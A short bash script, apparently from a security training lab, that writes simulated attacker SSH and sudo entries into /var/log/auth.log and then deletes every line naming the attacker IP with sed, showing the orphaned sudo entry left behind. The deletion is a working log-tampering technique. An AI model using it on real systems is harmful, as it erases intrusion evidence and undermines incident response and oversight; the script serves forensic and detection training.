#!/bin/bash
# BREAK: Log tampering — surgical deletion of attacker activity from auth.log

# Step 1 — simulate attack evidence in auth.log
mkdir -p /var/log
echo "Mar 13 03:21:44 server sshd[1337]: Failed password for root from 192.168.1.99 port 4444 ssh2" >> /var/log/auth.log
echo "Mar 13 03:21:51 server sshd[1337]: Accepted password for root from 192.168.1.99 port 4444 ssh2" >> /var/log/auth.log
echo "Mar 13 03:22:01 server sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash" >> /var/log/auth.log

echo "[BEFORE] auth.log contents:"
cat /var/log/auth.log

# Step 2 — surgical deletion of attacker IP
sed -i '/192.168.1.99/d' /var/log/auth.log

echo "[AFTER] auth.log after tampering:"
cat /var/log/auth.log

echo "[BREAK] SSH entries removed. Sudo entry remains with no preceding login."
